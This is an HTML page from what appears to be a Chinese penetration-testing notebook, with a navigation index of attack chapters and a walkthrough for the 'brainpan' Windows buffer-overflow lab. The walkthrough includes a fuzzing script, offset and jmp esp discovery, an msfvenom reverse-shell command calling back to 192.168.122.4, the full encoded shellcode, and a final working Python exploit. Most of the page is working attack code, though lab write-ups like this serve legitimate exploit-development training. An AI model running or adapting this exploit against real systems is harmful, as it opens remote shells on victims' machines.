<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>brainpan</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="methodology.html">methodology</a></p>

<ol>
<li><a href="methodology--第一部分_信息收集.html">第一部分 信息收集</a></li>
<ol>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集.html">第1章 端口信息收集</a></li>
<ol>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.1节_21端口ftp.html">第1.1节 21端口ftp</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.2节_22端口ssh.html">第1.2节 22端口ssh</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.3节_25端口SMTP.html">第1.3节 25端口SMTP</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.4节_53端口DNS.html">第1.4节 53端口DNS</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.5节_79端口Finger.html">第1.5节 79端口Finger</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.6节_161端口snmp.html">第1.6节 161端口snmp</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.7节_137-139-445_smb.html">第1.7节 137/139/445 smb</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.8节_389端口ldap.html">第1.8节 389端口ldap</a></li>
<li><a href="methodology--第一部分_信息收集--第1章_端口信息收集--第1.9节_2049端口nfs.html">第1.9节 2049端口nfs</a></li>
</ol>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集.html">第2章 web信息收集</a></li>
<ol>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.1节_枚举web目录.html">第2.1节 枚举web目录</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.2节_http方法测试.html">第2.2节 http方法测试</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.3节_https方法测试.html">第2.3节 https方法测试</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.4节_web页面生成字典.html">第2.4节 web页面生成字典</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.5节_web页面图片泄露.html">第2.5节 web页面图片泄露</a></li>
<li><a href="methodology--第一部分_信息收集--第2章_web信息收集--第2.6节_Squid代理.html">第2.6节 Squid代理</a></li>
</ol>
</ol>
<li><a href="methodology--第二部分_漏洞利用.html">第二部分 漏洞利用</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第3章_未知exp的漏洞.html">第3章 未知exp的漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第3章_未知exp的漏洞--第3.1节_搜索exp.html">第3.1节 搜索exp</a></li>
<li><a href="methodology--第二部分_漏洞利用--第3章_未知exp的漏洞--第3.2节_下载exp.html">第3.2节 下载exp</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助.html">第4章 漏洞利用辅助</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.1节_文件字符串分析.html">第4.1节 文件字符串分析</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.2节_webshell.html">第4.2节 webshell</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.3节_反弹shell.html">第4.3节 反弹shell</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.4节_突破受限制的shell.html">第4.4节 突破受限制的shell</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.5节_传输文件.html">第4.5节 传输文件</a></li>
<li><a href="methodology--第二部分_漏洞利用--第4章_漏洞利用辅助--第4.6节_错误处理.html">第4.6节 错误处理</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞.html">第5章 通用漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.1节_登录凭证.html">第5.1节 登录凭证</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.2节_http_PUT方法.html">第5.2节 http PUT方法</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.3节_Shellshock.html">第5.3节 Shellshock</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.4节_任意文件读取LFI.html">第5.4节 任意文件读取LFI</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.5节_远程命令执行.html">第5.5节 远程命令执行</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞.html">第5.6节 sql注入漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞--mysql注入.html">mysql注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞--mssql注入.html">mssql注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.6节_sql注入漏洞--oracle注入.html">oracle注入</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.7节_上传漏洞.html">第5.7节 上传漏洞</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.8节_Nosql注入.html">第5.8节 Nosql注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.9节_LDAP注入.html">第5.9节 LDAP注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.10节_服务端模板注入.html">第5.10节 服务端模板注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.11节_xxe漏洞.html">第5.11节 xxe漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.11节_xxe漏洞--案例1_excel的xxe.html">案例1: excel的xxe</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.11节_xxe漏洞--案例2_php的xxe执行命令.html">案例2 php的xxe执行命令</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.12节_xpath注入.html">第5.12节 xpath注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.13节_SSRF.html">第5.13节 SSRF</a></li>
<li><a href="methodology--第二部分_漏洞利用--第5章_通用漏洞--第5.14节_Padding_Oracle_Attack.html">第5.14节 Padding Oracle Attack</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞.html">第6章 已知漏洞</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.1节_nodejs.html">第6.1节 nodejs</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php.html">第6.2节 php</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--弱类型.html">弱类型</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--php一句话.html">php一句话</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--php代码注入.html">php代码注入</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.2节_php--php代码审计.html">php代码审计</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java.html">第6.3节 java</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java--处理excel导致的xxe漏洞.html">处理excel导致的xxe漏洞</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java--java反序列化demo.html">java反序列化demo</a></li>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.3节_java--Apache_Shiro_rememberMe反序列化.html">Apache Shiro rememberMe反序列化</a></li>
</ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.4节_thinkphp.html">第6.4节 thinkphp</a></li>
<ol>
<li><a href="methodology--第二部分_漏洞利用--第6章_已知漏洞--第6.4节_thinkphp--thinkphp5.0.235.1.31.html">thinkphp<5.0.23<5.1.31</a></li>
</ol>
</ol>
</ol>
<li><a href="methodology--第三部分_权限提升.html">第三部分 权限提升</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权.html">第7章 linux提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.1节_寻找登录凭证.html">第7.1节 寻找登录凭证</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.2节_寻找可写文件.html">第7.2节 寻找可写文件</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.3节_内核提权.html">第7.3节 内核提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.3节_内核提权--案例1_dirtyc0w提权.html">案例1 dirtyc0w提权</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.3节_内核提权--案例2_ubuntu提权.html">案例2 ubuntu提权</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权.html">第7.4节 进程提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.1_mysql.html">4.3.1 mysql</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.2_nfs提权.html">4.3.2 nfs提权</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.3_chkrootkit提权.html">4.3.3 chkrootkit提权</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.4节_进程提权--4.3.4_tar通配符提权.html">4.3.4 tar通配符提权</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.5节_定时任务.html">第7.5节 定时任务</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.6节_sudo提权.html">第7.6节 sudo提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.6节_sudo提权--4.5.1_nmap.html">4.5.1 nmap</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.7节_SUID文件.html">第7.7节 SUID文件</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.8节_root.html">第7.8节 root</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.8节_root--4.7.1_执行命令.html">4.7.1 执行命令</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.8节_root--4.7.2_编辑文件.html">4.7.2 编辑文件</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.9节_劫持全路径.html">第7.9节 劫持全路径</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.10_环境变量.html">第7.10 环境变量</a></li>
<li><a href="methodology--第三部分_权限提升--第7章_linux提权--第7.11节_破解shadow文件.html">第7.11节 破解shadow文件</a></li>
</ol>
<li><a href="methodology--第三部分_权限提升--第8章_windows提权.html">第8章 windows提权</a></li>
<ol>
<li><a href="methodology--第三部分_权限提升--第8章_windows提权--windows提权辅助.html">windows提权辅助</a></li>
</ol>
</ol>
<li><a href="methodology--第四部分_内网漫游.html">第四部分 内网漫游</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot.html">第9章 Pivot</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.1节_ssh端口转发.html">第9.1节 ssh端口转发</a></li>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.2节_iptables端口转发.html">第9.2节 iptables端口转发</a></li>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.3节_msf后渗透.html">第9.3节 msf后渗透</a></li>
<li><a href="methodology--第四部分_内网漫游--第9章_Pivot--第9.0节_未整理.html">第9.0节 未整理</a></li>
</ol>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出.html">第10章 缓冲区溢出</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出--第10.1节_windows溢出.html">第10.1节 windows溢出</a></li>
<ol>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出--第10.1节_windows溢出--brainpan.html">brainpan</a></li>
<li><a href="methodology--第四部分_内网漫游--第10章_缓冲区溢出--第10.1节_windows溢出--smail案例.html">smail案例</a></li>
</ol>
</ol>
<li><a href="methodology--第四部分_内网漫游--metasploit.html">metasploit</a></li>
<li><a href="methodology--第四部分_内网漫游--backdoor.html">backdoor</a></li>
</ol>
<li><a href="methodology--第五部分_挖掘src.html">第五部分 挖掘src</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试.html">10. 业务逻辑测试</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论.html">10.1 业务逻辑理论</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.1_业务逻辑数据一致性.html">6.1.1 业务逻辑数据一致性</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.2_业务逻辑数据完整性.html">6.1.2 业务逻辑数据完整性</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.3_工作流程逃逸测试.html">6.1.3 工作流程逃逸测试</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.4_伪造请求能力测试.html">6.1.4 伪造请求能力测试</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--6.1.5_测试处理用时.html">6.1.5 测试处理用时</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.1_业务逻辑理论--10.1.6_客户端认证.html">10.1.6 客户端认证</a></li>
</ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法.html">10.2 攻击方法</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.1_加密http请求参数.html">6.2.1.1 加密http请求参数</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.2_修改返回包.html">6.2.1.2 修改返回包</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.3_修改http参数.html">6.2.1.3 修改http参数</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.2_攻击方法--6.2.1.4_去除http请求参数.html">6.2.1.4 去除http请求参数</a></li>
</ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景.html">10.3 业务场景</a></li>
<ol>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.1_用户操作.html">10.3.1 用户操作</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.2_用户注册.html">10.3.2 用户注册</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.3_修改密码.html">10.3.3 修改密码</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.4_验证码安全.html">10.3.4 验证码安全</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.5_订单安全.html">10.3.5 订单安全</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.6_功能使用次数.html">10.3.6 功能使用次数</a></li>
<li><a href="methodology--第五部分_挖掘src--10._业务逻辑测试--10.3_业务场景--10.3.7_客户端验证密码.html">10.3.7 客户端验证密码</a></li>
</ol>
</ol>
<li><a href="methodology--第五部分_挖掘src--11._app安全.html">11. app安全</a></li>
</ol>
<li><a href="methodology--oob.html">oob</a></li>
<li><a href="methodology--DDOS.html">DDOS</a></li>
<ol>
<li><a href="methodology--DDOS--DDOS事件处理.html">DDOS事件处理</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>brainpan</u></b></h1>1. socket通讯<br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;socket,sys<br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((sys.argv[<span style="color:#ff0044;font-weight:400">1</span>],<span style="color:#ff0044;font-weight:400">9999</span>))<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br /><span style="color:#ff9d00;font-weight:700">print</span>&nbsp;data<br /><span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'test'</span><br />s.send(<span style="color:#ff9d00;font-weight:700">buffer</span>+<span style="color:#3ad900;font-weight:400">'\r\n'</span>)<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br /><span style="color:#ff9d00;font-weight:700">print</span>&nbsp;data<br />s.close()</div></div><br /><br />2. 测试溢出<br /><img src="images\79-1.png" alt="images\79-1.png" /><br /><br />3. 定位jmp esp<br />/usr/bin/msf-pattern_create -l 1024<br /><img src="images\79-2.png" alt="images\79-2.png" /><br />35724134<br /><br />/usr/bin/msf-pattern_offset -q 35724134<br />524<br /><br />4. 替代测试<br />524*'A' + 4*'B' + (1024-524-4)*'C'<br /><img src="images\79-3.png" alt="images\79-3.png" /><br /><br />5. 寻找badchars<br />0x00<br /><img src="images\79-4.png" alt="images\79-4.png" /><br /><br />6. 生成shellcode<br />msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.4 LPORT=1234 -f c -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai<br /><br />shellcode =("\xda\xc0\xba\xef\x94\xa4\x69\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"<br />        "\x52\x83\xee\xfc\x31\x56\x13\x03\xb9\x87\x46\x9c\xb9\x40\x04"<br />        "\x5f\x41\x91\x69\xe9\xa4\xa0\xa9\x8d\xad\x93\x19\xc5\xe3\x1f"<br />        "\xd1\x8b\x17\xab\x97\x03\x18\x1c\x1d\x72\x17\x9d\x0e\x46\x36"<br />        "\x1d\x4d\x9b\x98\x1c\x9e\xee\xd9\x59\xc3\x03\x8b\x32\x8f\xb6"<br />        "\x3b\x36\xc5\x0a\xb0\x04\xcb\x0a\x25\xdc\xea\x3b\xf8\x56\xb5"<br />        "\x9b\xfb\xbb\xcd\x95\xe3\xd8\xe8\x6c\x98\x2b\x86\x6e\x48\x62"<br />        "\x67\xdc\xb5\x4a\x9a\x1c\xf2\x6d\x45\x6b\x0a\x8e\xf8\x6c\xc9"<br />        "\xec\x26\xf8\xc9\x57\xac\x5a\x35\x69\x61\x3c\xbe\x65\xce\x4a"<br />        "\x98\x69\xd1\x9f\x93\x96\x5a\x1e\x73\x1f\x18\x05\x57\x7b\xfa"<br />        "\x24\xce\x21\xad\x59\x10\x8a\x12\xfc\x5b\x27\x46\x8d\x06\x20"<br />        "\xab\xbc\xb8\xb0\xa3\xb7\xcb\x82\x6c\x6c\x43\xaf\xe5\xaa\x94"<br />        "\xd0\xdf\x0b\x0a\x2f\xe0\x6b\x03\xf4\xb4\x3b\x3b\xdd\xb4\xd7"<br />        "\xbb\xe2\x60\x77\xeb\x4c\xdb\x38\x5b\x2d\x8b\xd0\xb1\xa2\xf4"<br />        "\xc1\xba\x68\x9d\x68\x41\xfb\x62\xc4\x33\xff\x0a\x17\xc3\xfb"<br />        "\x18\x9e\x25\x69\x8d\xf7\xfe\x06\x34\x52\x74\xb6\xb9\x48\xf1"<br />        "\xf8\x32\x7f\x06\xb6\xb2\x0a\x14\x2f\x33\x41\x46\xe6\x4c\x7f"<br />        "\xee\x64\xde\xe4\xee\xe3\xc3\xb2\xb9\xa4\x32\xcb\x2f\x59\x6c"<br />        "\x65\x4d\xa0\xe8\x4e\xd5\x7f\xc9\x51\xd4\xf2\x75\x76\xc6\xca"<br />        "\x76\x32\xb2\x82\x20\xec\x6c\x65\x9b\x5e\xc6\x3f\x70\x09\x8e"<br />        "\xc6\xba\x8a\xc8\xc6\x96\x7c\x34\x76\x4f\x39\x4b\xb7\x07\xcd"<br />        "\x34\xa5\xb7\x32\xef\x6d\xc7\x78\xad\xc4\x40\x25\x24\x55\x0d"<br />        "\xd6\x93\x9a\x28\x55\x11\x63\xcf\x45\x50\x66\x8b\xc1\x89\x1a"<br />        "\x84\xa7\xad\x89\xa5\xed")<br />        <br />7. jmp esp寻找<br />!mona modules<br />!mona find -s "\xFF\xE4" -m brainpan.exe <br /><img src="images\79-5.png" alt="images\79-5.png" /><br /><span style="color:#ff0000;">0x311712f3</span><br />8. 最终exp<br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;socket,sys<br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((sys.argv[<span style="color:#ff0044;font-weight:400">1</span>],<span style="color:#ff0044;font-weight:400">9999</span>))<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br /><span style="color:#ff9d00;font-weight:700">print</span>&nbsp;data<br />shellcode&nbsp;=(<span style="color:#3ad900;font-weight:400">"\xda\xc0\xba\xef\x94\xa4\x69\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x52\x83\xee\xfc\x31\x56\x13\x03\xb9\x87\x46\x9c\xb9\x40\x04"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x5f\x41\x91\x69\xe9\xa4\xa0\xa9\x8d\xad\x93\x19\xc5\xe3\x1f"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xd1\x8b\x17\xab\x97\x03\x18\x1c\x1d\x72\x17\x9d\x0e\x46\x36"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x1d\x4d\x9b\x98\x1c\x9e\xee\xd9\x59\xc3\x03\x8b\x32\x8f\xb6"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x3b\x36\xc5\x0a\xb0\x04\xcb\x0a\x25\xdc\xea\x3b\xf8\x56\xb5"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x9b\xfb\xbb\xcd\x95\xe3\xd8\xe8\x6c\x98\x2b\x86\x6e\x48\x62"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x67\xdc\xb5\x4a\x9a\x1c\xf2\x6d\x45\x6b\x0a\x8e\xf8\x6c\xc9"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xec\x26\xf8\xc9\x57\xac\x5a\x35\x69\x61\x3c\xbe\x65\xce\x4a"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x98\x69\xd1\x9f\x93\x96\x5a\x1e\x73\x1f\x18\x05\x57\x7b\xfa"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x24\xce\x21\xad\x59\x10\x8a\x12\xfc\x5b\x27\x46\x8d\x06\x20"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xab\xbc\xb8\xb0\xa3\xb7\xcb\x82\x6c\x6c\x43\xaf\xe5\xaa\x94"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xd0\xdf\x0b\x0a\x2f\xe0\x6b\x03\xf4\xb4\x3b\x3b\xdd\xb4\xd7"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xbb\xe2\x60\x77\xeb\x4c\xdb\x38\x5b\x2d\x8b\xd0\xb1\xa2\xf4"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xc1\xba\x68\x9d\x68\x41\xfb\x62\xc4\x33\xff\x0a\x17\xc3\xfb"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x18\x9e\x25\x69\x8d\xf7\xfe\x06\x34\x52\x74\xb6\xb9\x48\xf1"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xf8\x32\x7f\x06\xb6\xb2\x0a\x14\x2f\x33\x41\x46\xe6\x4c\x7f"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xee\x64\xde\xe4\xee\xe3\xc3\xb2\xb9\xa4\x32\xcb\x2f\x59\x6c"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x65\x4d\xa0\xe8\x4e\xd5\x7f\xc9\x51\xd4\xf2\x75\x76\xc6\xca"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x76\x32\xb2\x82\x20\xec\x6c\x65\x9b\x5e\xc6\x3f\x70\x09\x8e"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xc6\xba\x8a\xc8\xc6\x96\x7c\x34\x76\x4f\x39\x4b\xb7\x07\xcd"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x34\xa5\xb7\x32\xef\x6d\xc7\x78\xad\xc4\x40\x25\x24\x55\x0d"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xd6\x93\x9a\x28\x55\x11\x63\xcf\x45\x50\x66\x8b\xc1\x89\x1a"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x84\xa7\xad\x89\xa5\xed"</span>)<br /><span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">524</span>*<span style="color:#3ad900;font-weight:400">'A'</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'\xf3\x12\x17\x31'</span>&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">4</span>*<span style="color:#3ad900;font-weight:400">'\x90\x90\x90\x90'</span>&nbsp;+&nbsp;shellcode<br />s.send(<span style="color:#ff9d00;font-weight:700">buffer</span>+<span style="color:#3ad900;font-weight:400">'\r\n'</span>)<br />data&nbsp;=&nbsp;s.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br /><span style="color:#ff9d00;font-weight:700">print</span>&nbsp;data<br />s.close()</div></div><br /><img src="images\79-6.png" alt="images\79-6.png" /><br /><br /><br /><br /></div></div>
</body></html>